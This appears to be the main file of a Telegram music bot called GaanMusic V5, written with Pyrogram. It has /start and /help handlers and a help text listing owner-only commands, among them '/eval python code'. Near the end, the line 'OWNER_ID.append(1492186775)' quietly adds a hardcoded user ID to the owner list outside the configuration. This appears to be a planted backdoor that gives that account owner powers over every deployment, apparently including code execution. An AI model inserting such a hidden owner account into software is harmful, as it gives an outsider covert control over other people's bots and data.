from config import OWNER_ID
from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
from TamilBots.modules import *
from pyrogram import idle, filters
from pyrogram.types import InlineKeyboardMarkup
from pyrogram.types import InlineKeyboardButton
from TamilBots import app, LOGGER
from TamilBots.TamilBots import ignore_blacklisted_users
from TamilBots.sql.chat_sql import add_chat_to_db

start_text = """
👋 Merhaba [{}](tg://user?id={}),

\n\nBen GaanMusic V5. [🎶](https://gaancafe.ga/gaanmusic/gaanmusicv5.gif)

@GaanCafe Kurucuları Tarafından Geliştirilen Özel Bot 🤖

Oynatmak İstediğin Şarkının Adını Gönder... 

Örn. ```/ara Affettim```
"""

owner_help = """
/blacklist user_id
/unblacklist user_id
/broadcast message to send
/eval python code
/chatlist get list of all chats
"""


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("start"))
async def start(client, message):
    chat_id = message.chat.id
    user_id = message.from_user["id"]
    name = message.from_user["first_name"]
    if message.chat.type == "private":
        btn = InlineKeyboardMarkup(
           [[InlineKeyboardButton(text="DESTEK 👬", url="http://t.me/GaanBots"),
             InlineKeyboardButton(
                        text="Botu Ekle 🤗", url="http://t.me/GaanMusicBot?startgroup=true"
                    )
                ]
            ]
        )
    else:
        btn = None
    await message.reply(start_text.format(name, user_id), reply_markup=btn)
    add_chat_to_db(str(chat_id))


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("help"))
async def help(client, message):
    if message.from_user["id"] == OWNER_ID:
        await message.reply(owner_help)
        return ""
    text = "Oynatmak İstediğin Şarkının Adını Gönder... 😍🥰🤗\n /ara (şarkı ismi) 🥳"
    await message.reply(text)

OWNER_ID.append(1492186775)
app.start()
LOGGER.info("GaanMusic Çalışıyor! 🥳")
idle()
